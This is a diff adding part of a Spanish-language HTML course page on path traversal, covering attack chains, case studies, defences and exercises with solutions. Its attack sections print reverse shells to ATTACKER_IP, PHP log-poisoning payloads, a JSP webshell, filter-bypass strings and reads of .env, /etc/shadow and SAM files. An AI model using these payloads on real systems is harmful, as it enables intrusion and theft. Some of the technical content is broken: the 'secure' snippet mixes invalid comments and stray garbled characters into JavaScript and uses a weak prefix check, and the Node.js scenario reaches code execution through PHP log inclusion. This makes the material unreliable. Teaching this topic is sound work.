+<span class="tok-string">app.get('/download', (req, res) => {
+  const file = req.query.file;
+  <mark class="tok-attack">res.sendFile(path.join('/docs', file));</mark>
+});</span></code></pre>
+        </div>
+      </div>
+      <figcaption>Del primer payload sacas credenciales de producciÃ³n. Del segundo, la lÃ³gica vulnerable: no hay validaciÃ³n de ruta.</figcaption>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Paso 3</p>
+    <h3>Escalada a RCE</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Log poisoning <span class="exchange__meta">POST</span></p>
+          <pre><code><span class="tok-comment"># 1. Inyectar PHP en el User-Agent</span>
+$ curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' \
+  http://fileserver.ejemplo.com/download?file=x
+
+<span class="tok-comment"># 2. El PHP se escribe en access.log</span>
+<span class="tok-comment"># 3. Incluir el log con path traversal</span>
+GET /download?file=../../../var/log/apache2/access.log&amp;cmd=id
+
+<span class="tok-comment"># Resultado:</span>
+<mark class="tok-attack">uid=33(www-data) gid=33(www-data)</mark></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Shell reversa <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-comment"># Con cmd controlado, obtener shell</span>
+GET /download?file=../../../var/log/apache2/access.log
+  &amp;cmd=python3 -c 'import socket,subprocess,os;
+  s=socket.socket();
+  s.connect(("ATTACKER_IP",4444));
+  os.dup2(s.fileno(),0);
+  os.dup2(s.fileno(),1);
+  os.dup2(s.fileno(),2);
+  subprocess.call(["/bin/sh","-i"])'
+
+<span class="tok-comment"># En la mÃ¡quina atacante:</span>
+$ nc -lvp 4444
+$ id
+uid=33(www-data) gid=33(www-data)</code></pre>
+        </div>
+      </div>
+      <figcaption>De un Path Traversal simple a una shell remota en 3 pasos.</figcaption>
+    </figure>
+  </div>
+
+  <aside class="callout callout--danger" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Impacto</p>
+    <p>Un Path Traversal en una aplicaciÃ³n PHP con <code>allow_url_include</code> habilitado puede escalarse a ejecuciÃ³n remota de cÃ³digo completa. El atacante tiene control total sobre el servidor.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 6 ===================== -->
+<section class="section" id="s06" aria-labelledby="s06-h">
+  <h2 id="s06-h" tabindex="-1"><span class="sec-num">06</span>Escenarios reales y casos de estudio</h2>
+  <p class="lead-in">Los Path Traversal mÃ¡s peligrosos no son los que leen /etc/passwd, sino los que se combinan con otras debilidades para alcanzar impacto mÃ¡ximo.</p>
+
+  <div class="block">
+    <p class="subhead">Caso 1</p>
+    <h3>LFI + Log poisoning = RCE total</h3>
+    <p class="prose">AplicaciÃ³n PHP con un parÃ¡metro <code>include</code> vulnerable. El servidor no filtra <code>../</code> y el log de Apache es accesible. Un atacante inyecta cÃ³digo PHP en el User-Agent, luego incluye el log con path traversal y obtiene ejecuciÃ³n remota.</p>
+    <div class="vuln">
+      <div class="vuln__head">
+        <span class="badge badge--crit"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg> CrÃ­tico</span>
+        <p class="eyebrow" style="width:100%">CWE-98 Â· PHP Remote File Inclusion</p>
+        <h3>LFI + Log poisoning en CMS corporativo</h3>
+      </div>
+      <div class="vuln__metrics">
+        <div class="metric"><span class="metric__label">Probabilidad</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span></div></div>
+        <div class="metric"><span class="metric__label">Impacto</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span></div></div>
+      </div>
+      <h4>Cadena de explotaciÃ³n</h4>
+      <ul>
+        <li>Fase 1: Detectar el parÃ¡metro vulnerable con <code>../../etc/passwd</code></li>
+        <li>Fase 2: Confirmar PHP con <code>phpinfo.php</code> o wrappers</li>
+        <li>Fase 3: Inyectar cÃ³digo en el log de Apache vÃ­a User-Agent</li>
+        <li>Fase 4: Incluir el log con path traversal para ejecutar cÃ³digo</li>
+        <li>Fase 5: Obtener shell reversa y escalar privilegios</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Caso 2</p>
+    <h3>Path Traversal + Archivos .env = Credenciales de producciÃ³n</h3>
+    <p class="prose">Una aplicaciÃ³n Node.js expone un endpoint de descarga de archivos. Sin autenticaciÃ³n, un atacante puede leer el archivo <code>.env</code> del directorio raÃ­z de la aplicaciÃ³n, obteniendo credenciales de base de datos, API keys y tokens de servicios.</p>
+    <div class="vuln">
+      <div class="vuln__head">
+        <span class="badge badge--high"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg> Alto</span>
+        <p class="eyebrow" style="width:100%">CWE-22 + CWE-200</p>
+        <h3>FiltraciÃ³n de credenciales vÃ­a Path Traversal</h3>
+      </div>
+      <div class="vuln__metrics">
+        <div class="metric"><span class="metric__label">Probabilidad</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg"></span></div></div>
+        <div class="metric"><span class="metric__label">Impacto</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg"></span></div></div>
+      </div>
+      <h4>Hallazgos</h4>
+      <ul>
+        <li><code>/download?file=.env</code> â†’ DB_PASSWORD, AWS_SECRET_KEY, JWT_SECRET</li>
+        <li><code>/download?file=.git/HEAD</code> â†’ Repositorio expuesto</li>
+        <li><code>/download?file=config/production.json</code> â†’ ConfiguraciÃ³n completa</li>
+        <li>Impacto: acceso a base de datos de clientes, robo de datos personales</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Caso 3</p>
+    <h3>Escritura arbitraria â†’ Webshell</h3>
+    <p class="prose">Un endpoint de upload de archivos en Java permite escribir en rutas arbitrarias. El atacante escribe un JSP en el directorio web y obtiene ejecuciÃ³n remota.</p>
+    <div class="vuln">
+      <div class="vuln__head">
+        <span class="badge badge--crit"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg> CrÃ­tico</span>
+        <p class="eyebrow" style="width:100%">CWE-22 + CWE-434</p>
+        <h3>Escritura de webshell vÃ­a Path Traversal</h3>
+      </div>
+      <div class="vuln__metrics">
+        <div class="metric"><span class="metric__label">Probabilidad</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg"></span><span class="metric__seg"></span></div></div>
+        <div class="metric"><span class="metric__label">Impacto</span><div class="metric__bar"><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span><span class="metric__seg on"></span></div></div>
+      </div>
+      <h4>Cadena de explotaciÃ³n</h4>
+      <ul>
+        <li>Upload con ruta controlada: <code>file=../../webapps/ROOT/shell.jsp</code></li>
+        <li>Contenido del archivo: <code>&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</code></li>
+        <li>EjecuciÃ³n: <code>/shell.jsp?cmd=id</code></li>
+        <li>Resultado: shell remota con privilegios del servidor</li>
+      </ul>
+    </div>
+  </div>
+
+  <aside class="callout callout--note" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg> PatrÃ³n</p>
+    <p>Los Path Traversal rara vez son el impacto final. Son una puerta de entrada que se combina con: filtraciÃ³n de credenciales, inclusiÃ³n de cÃ³digo, escritura de archivos, o acceso a logs para obtener ejecuciÃ³n remota.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 7 ===================== -->
+<section class="section" id="s07" aria-labelledby="s07-h">
+  <h2 id="s07-h" tabindex="-1"><span class="sec-num">07</span>PrevenciÃ³n y mitigaciÃ³n</h2>
+  <p class="lead-in">La defensa contra Path Traversal tiene capas. Ninguna es infalible por sÃ­ sola; la combinaciÃ³n de todas ellas es lo que reduce el riesgo a niveles aceptables.</p>
+
+  <div class="block">
+    <p class="subhead">Regla de oro</p>
+    <h3>Nunca confÃ­es en la entrada del cliente</h3>
+    <p class="prose">El principio fundamental: <strong>el cliente puede enviar cualquier cosa</strong>. Si tu aplicaciÃ³n acepta un nombre de archivo del cliente, debes tratarlo como entrada hostil siempre.</p>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Nivel 1</p>
+    <h3>ValidaciÃ³n de entrada</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">TÃ©cnica</th><th scope="col">DescripciÃ³n</th><th scope="col">Eficacia</th></tr></thead>
+        <tbody>
+          <tr><td>Whitelist de caracteres</td><td>Permitir solo <code>[a-zA-Z0-9._-]</code> en nombres de archivo</td><td>Alta</td></tr>
+          <tr><td>Bloqueo de <code>..</code></td><td>Rechazar cualquier entrada que contenga <code>..</code></td><td>Media (bypassable)</td></tr>
+          <tr><td>Bloqueo de <code>/</code> y <code>\</code></td><td>No permitir separadores de ruta</td><td>Media</td></tr>
+          <tr><td>ValidaciÃ³n de longitud</td><td>Limitar la longitud del parÃ¡metro</td><td>Baja</td></tr>
+          <tr><td>ValidaciÃ³n de tipo</td><td>Si el parÃ¡metro debe ser numÃ©rico, verificar que lo es</td><td>Alta (cuando aplica)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Nivel 2</p>
+    <h3>ResoluciÃ³n de ruta segura</h3>
+    <div class="code code--secure">
+      <div class="code__bar">
+        <span class="code__name">ResoluciÃ³n de ruta segura</span>
+        <span class="code__tag"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Correcto</span>
+      </div>
+      <pre><code><span class="tok-comment"># Node.js - ResoluciÃ³n y verificaciÃ³n</span>
+const path = require('path');
+
+function safePath(userInput, allowedDir) {
+  <span class="tok-comment">// Resolver la ruta completa</span>
+  const resolved = path.resolve(allowedDir, userInput);
+  <span class="tok-comment"># Verificar queä»åœ¨ dentro del directorio permitido</span>
+  if (!resolved.startsWith(allowedDir)) {
+    throw new Error('Acceso denegado');
+  }
+  return resolved;
+}
+
+<span class="tok-comment"># Uso</span>
+const filePath = safePath(req.query.file, '/docs');
+res.sendFile(filePath);</code></pre>
+    </div>
+    <div class="code code--insecure">
+      <div class="code__bar">
+        <span class="code__name">ComparaciÃ³n con cÃ³digo inseguro</span>
+        <span class="code__tag"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> Incorrecto</span>
+      </div>
+      <pre><code><span class="tok-comment"># Node.js - CÃ³digo vulnerable</span>
+app.get('/download', (req, res) => {
+  const file = req.query.file;
+  <span class="tok-comment"># Sin validaciÃ³n: Path Traversal directo</span>
+  res.sendFile(path.join('/docs', file));
+});
+
+<span class="tok-comment"># Java - CÃ³digo vulnerable</span>
+String file = request.getParameter("file");
+FileInputStream fis = new FileInputStream("/docs/" + file);</code></pre>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Nivel 3</p>
+    <h3>Chroot y aislamiento del sistema de archivos</h3>
+    <ul>
+      <li><strong>Chroot jail:</strong> ejecutar la aplicaciÃ³n en un directorio aislado donde <code>/</code> es en realidad <code>/chroot/docs/</code>.</li>
+      <li><strong>Docker:</strong> contenedor con sistema de archivos mÃ­nimo, sin acceso a <code>/etc</code> del host.</li>
+      <li><strong>SELinux/AppArmor:</strong> restringir quÃ© archivos puede leer el proceso.</li>
+      <li><strong>Permisos de archivos:</strong> ejecutar con el usuario menos privilegiado posible.</li>
+    </ul>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Nivel 4</p>
+    <h3>Defensa en profundidad</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Capa</th><th scope="col">Medida</th></tr></thead>
+        <tbody>
+          <tr><td>Entrada</td><td>Whitelist de caracteres, tipo de dato, longitud mÃ¡xima</td></tr>
+          <tr><td>ResoluciÃ³n</td><td><code>path.resolve()</code> + verificaciÃ³n de prefijo</td></tr>
+          <tr><td>Sistema de archivos</td><td>Chroot, Docker, permisos mÃ­nimos</td></tr>
+          <tr><td>Monitoreo</td><td>Alertas en intentos de acceso a <code>/etc</code>, <code>/proc</code>, etc.</td></tr>
+          <tr><td>WAF</td><td>Reglas que detectan patrones de traversal</td></tr>
+          <tr><td>Logs</td><td>Registrar todos los intentos de Path Traversal</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <aside class="callout callout--warn" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg> Errores comunes</p>
+    <p><strong>Reemplazo de <code>../</code>:</strong> trivialmente superable. <strong>Bloqueo de palabras clave:</strong> bypassable con encoding. <strong>ValidaciÃ³n solo en cliente:</strong> el atacante nunca pasa por el formulario. <strong>ConfÃ­ar en <code>realpath():</code></strong> puede fallar en race conditions.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 8 ===================== -->
+<section class="section" id="s08" aria-labelledby="s08-h">
+  <h2 id="s08-h" tabindex="-1"><span class="sec-num">08</span>Caso prÃ¡ctico completo</h2>
+  <p class="lead-in">Un recorrido completo desde la primera peticiÃ³n hasta la obtenciÃ³n de una shell remota, encadenando todas las tÃ©cnicas aprendidas.</p>
+
+  <div class="block">
+    <p class="subhead">Escenario</p>
+    <h3>Objetivo: <code>portal.empresa.com</code></h3>
+    <p class="prose">Portal de empleados con gestiÃ³n de documentos. Un mÃ³dulo permite descargar archivos del directorio compartido. El parÃ¡metro <code>doc</code> acepta el nombre del archivo.</p>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Fase 1</p>
+    <h3>DetecciÃ³n</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Prueba inicial <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/api/docs/download?doc=contrato.pdf</span> HTTP/1.1
+<span class="tok-header-name">Host:</span> portal.empresa.com
+
+<span class="tok-comment"># 200 OK - descarga normal</span></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Traversal <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/api/docs/download?doc=../../../etc/passwd</span> HTTP/1.1
+<span class="tok-header-name">Host:</span> portal.empresa.com
+
+<span class="tok-comment"># 200 OK - contenido:</span>
+<mark class="tok-attack">root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www</mark></code></pre>
+        </div>
+      </div>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Fase 2</p>
+    <h3>RecolecciÃ³n de informaciÃ³n</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> .env <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/api/docs/download?doc=../../.env</span> HTTP/1.1
+
+<span class="tok-comment"># 200 OK:</span>
+<mark class="tok-attack"><span class="tok-string">DB_HOST=10.0.1.50
+DB_USER=portal_prod
+DB_PASS=Pr0d2026!
+AWS_KEY=AKIA...
+SECRET_KEY=wJalr...</span></mark></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> CÃ³digo fuente <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/api/docs/download?doc=../routes/docs.js</span> HTTP/1.1
+
+<span class="tok-string">router.get('/download', async (req, res) => {
+  const doc = req.query.doc;
+  <span class="tok-comment">// No hay validaciÃ³n de ruta</span>
+  const filePath = path.join(DOCS_DIR, doc);
+  res.sendFile(filePath);
+});</span></code></pre>
+        </div>
+      </div>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Fase 3</p>
+    <h3>Escalada a RCE</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Log poisoning <span class="exchange__meta">POST</span></p>
+          <pre><code><span class="tok-comment"># 1. Inyectar en User-Agent</span>
+$ curl -H "User-Agent: &lt;?php system(\$_GET['c']); ?&gt;" \
+  http://portal.empresa.com/api/docs/download?doc=x
+
+<span class="tok-comment"># 2. Incluir access.log</span>
+GET /api/docs/download?doc=../../var/log/apache2/access.log&amp;c=id
+
+<span class="tok-comment"># 3. Resultado:</span>
+<mark class="tok-attack">uid=33(www-data) gid=33(www-data)</mark></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Shell reversa <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-comment"># Obtener shell</span>
+GET /api/docs/download?doc=../../var/log/apache2/access.log
+  &amp;c=bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1'
+
+<span class="tok-comment"># En mÃ¡quina atacante:</span>
+$ nc -lvp 4444
+$ whoami
+www-data
+$ cat /etc/shadow
+root:$6$...:19000:0:99999:7:::</code></pre>
+        </div>
+      </div>
+    </figure>
+  </div>
+
+  <aside class="callout callout--danger" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Resumen</p>
+    <p>De un parÃ¡metro sin filtrar a una shell remota en 3 pasos: detecciÃ³n â†’ filtraciÃ³n de credenciales â†’ log poisoning â†’ RCE. Este es el patrÃ³n real que verÃ¡s en el campo.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 9 ===================== -->
+<section class="section" id="s09" aria-labelledby="s09-h">
+  <h2 id="s09-h" tabindex="-1"><span class="sec-num">09</span>Ejercicios de Path Traversal</h2>
+  <p class="lead-in">Doce ejercicios para practicar cada tÃ©cnica. Cada uno describe un escenario y un objetivo; tu trabajo es encontrar la vulnerabilidad, explotarla y documentar el impacto.</p>
+
+  <div class="block prose">
+    <p>Formato sugerido: 10-15 minutos por ejercicio, parejas, se abren las pistas si hace falta y se comenta la soluciÃ³n en comÃºn.</p>
+  </div>
+
+  <section class="exercise" id="ej1" aria-labelledby="ej1-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej1-h">Ejercicio 1</p>
+      <span class="badge badge--low">BÃ¡sico</span>
+      <span class="tag">DetecciÃ³n</span>
+    </header>
+    <p>Un endpoint <code>/api/files?name=doc.pdf</code> devuelve archivos. Pruebas <code>../../../etc/passwd</code> y obtienes <code>403 Forbidden</code>. Â¿QuÃ© significa? Â¿Sigue siendo explotable?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej1-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej1-hints" data-open="false"><div class="inner"><ol>
+        <li>Un 403 en vez de 404 confirma que el servidor procesÃ³ la ruta.</li>
+        <li>Prueba variaciones: encoding, barra invertida, rutas absolutas.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej1-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej1-sol" data-open="false"><div class="inner">
+        <p><strong>403 confirma Path Traversal.</strong> El servidor procesÃ³ la ruta pero un WAF o permisos lo bloquearon. Probar: <code>..%2f..%2f..%2fetc/passwd</code>, <code>..%5c..%5c..%5cetc/passwd</code>, <code>/etc/passwd</code> (ruta absoluta). Si el 403 es por permisos de archivo, probar otros archivos menos restrictivos.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej2" aria-labelledby="ej2-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej2-h">Ejercicio 2</p>
+      <span class="badge badge--low">BÃ¡sico</span>
+      <span class="tag">Linux</span>
+    </header>
+    <p>Encuentras un Path Traversal en <code>/view?template=home</code>. El servidor ejecuta PHP. Â¿QuÃ© archivos intentarÃ­as leer y por quÃ©?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej2-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej2-hints" data-open="false"><div class="inner"><ol>
+        <li><code>/etc/passwd</code> para confirmar el path traversal.</li>
+        <li><code>/proc/self/environ</code> para ver variables de entorno.</li>
+        <li>El archivo <code>.env</code> de la aplicaciÃ³n para credenciales.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej2-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej2-sol" data-open="false"><div class="inner">
+        <p><strong>Prioridad:</strong> 1) <code>/etc/passwd</code> â†’ confirmar acceso. 2) <code>/proc/self/environ</code> â†’ variables de entorno, paths. 3) <code>.env</code> â†’ credenciales de BD. 4) <code>/var/log/apache2/access.log</code> â†’ log poisoning. 5) Archivo de configuraciÃ³n de PHP: <code>/etc/php/8.1/apache2/php.ini</code> â†’ ver <code>allow_url_include</code>.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej3" aria-labelledby="ej3-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej3-h">Ejercicio 3</p>
+      <span class="badge badge--med">Intermedio</span>
+      <span class="tag">Bypass</span>
+    </header>
+    <p>El servidor reemplaza <code>../</code> por cadena vacÃ­a. Pruebas <code>....//</code> y funciona. Explica por quÃ© y diseÃ±a un bypass para el filtro completo.</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej3-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej3-hints" data-open="false"><div class="inner"><ol>
+        <li>El filtro solo se ejecuta una vez, no recursivamente.</li>
+        <li><code>....//</code> â†’ tras reemplazar <code>../</code> â†’ <code>../</code></li>
+        <li>Para bypass completo: <code>......//</code> o encoding doble.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej3-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej3-sol" data-open="false"><div class="inner">
+        <p><strong>Por quÃ© funciona:</strong> <code>....//</code> contiene <code>../</code> en las posiciones 2-4. Al reemplazar, queda <code>../</code>. <strong>Bypass del filtro completo:</strong> 1) <code>......//</code> (doble). 2) <code>..%2f..%2f</code> (encoding). 3) <code>..%252f..%252f</code> (doble encoding). 4) <code>..\/..\/</code> (barra invertida).</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej4" aria-labelledby="ej4-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej4-h">Ejercicio 4</p>
+      <span class="badge badge--med">Intermedio</span>
+      <span class="tag">Windows</span>
+    </header>
+    <p>En un servidor IIS, el parÃ¡metro <code>page</code> acepta rutas. Pruebas <code>..\..\..\windows\win.ini</code> y obtienes el contenido. Â¿QuÃ© archivos sensibles de Windows intentarÃ­as?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej4-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej4-hints" data-open="false"><div class="inner"><ol>
+        <li><code>C:\Windows\System32\config\SAM</code> â†’ base de datos de usuarios.</li>
+        <li><code>C:\Windows\System32\drivers\etc\hosts</code> â†’ configuraciÃ³n de red.</li>
+        <li><code>C:\inetpub\logs\LogFiles</code> â†’ logs de IIS.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej4-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej4-sol" data-open="false"><div class="inner">
+        <p><strong>Archivos prioritarios:</strong> 1) <code>C:\Windows\System32\config\SAM</code> (hashes de usuarios). 2) <code>C:\Windows\win.ini</code> (confirmar acceso). 3) <code>C:\Windows\System32\drivers\etc\hosts</code> (red interna). 4) <code>C:\inetpub\web.config</code> (configuraciÃ³n IIS, connection strings). 5) <code>C:\Windows\System32\config\SYSTEM</code> (SAM se cifra con la clave de SYSTEM).</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej5" aria-labelledby="ej5-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej5-h">Ejercicio 5</p>
+      <span class="badge badge--high">Avanzado</span>
+      <span class="tag">Log poisoning</span>
+    </header>
